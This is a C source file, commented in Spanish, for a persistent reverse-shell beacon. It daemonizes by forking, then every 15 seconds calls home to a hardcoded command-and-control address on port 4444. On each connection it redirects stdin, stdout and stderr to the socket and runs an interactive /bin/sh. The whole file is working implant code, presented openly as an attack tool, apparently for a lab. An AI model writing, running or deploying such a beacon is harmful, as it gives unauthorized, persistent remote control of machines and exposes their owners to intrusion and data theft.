#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define CITADEL_IP "192.168.122.140" // <-- Reemplaza con la IP interna de Citadel
#define PORT 4444
#define SLEEP_TIME 15             // Segundos entre cada latido (Heartbeat)

int main() {
    struct sockaddr_in server;
    int sock;

    // FASE 1: Daemonización (OpSec básica)
    // Nos bifurcamos del proceso padre para desvincularnos de la terminal interactiva.
    pid_t process_id = fork();
    if (process_id < 0) {
        exit(1); // Error al bifurcar
    }
    if (process_id > 0) {
        exit(0); // El proceso padre muere, el hijo queda libre en segundo plano
    }

    // FASE 2: El bucle infinito del Faro (Persistencia)
    while (1) {
        // Creamos un socket crudo de flujo TCP (SOCK_STREAM)
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(SLEEP_TIME);
            continue;
        }

        // Configuramos la dirección de destino (Tu central C2 en Citadel)
        server.sin_family = AF_INET;
        server.sin_port = htons(PORT);
        server.sin_addr.s_addr = inet_addr(CITADEL_IP);

        // FASE 3: Intento de conexión ("Llamar a casa")
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
            
            // Bifurcamos de nuevo para manejar la sesión interactiva.
            // Esto permite que si la shell se cierra, el bucle principal del beacon sobreviva.
            pid_t shell_pid = fork();
            
            if (shell_pid == 0) {
                // Proceso hijo: Redirección quirúrgica de Descriptores de Archivos
                // Duplicamos el socket sobre STDIN (0), STDOUT (1) y STDERR (2)
                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);

                // Ejecutamos la shell interactiva reemplazando la imagen del proceso hijo
                char *args[] = {"/bin/sh", "-i", NULL};
                execve(args[0], args, NULL);
                exit(0); 
            } else {
                // Proceso padre: Cierra su copia del socket y regresa a monitorear
                close(sock);
            }
        } else {
            // Si la conexión falla, cerramos el descriptor del socket para evitar fugas de recursos
            close(sock);
        }

        // Intervalo de hibernación antes del siguiente latido
        sleep(SLEEP_TIME);
    }

    return 0;
}
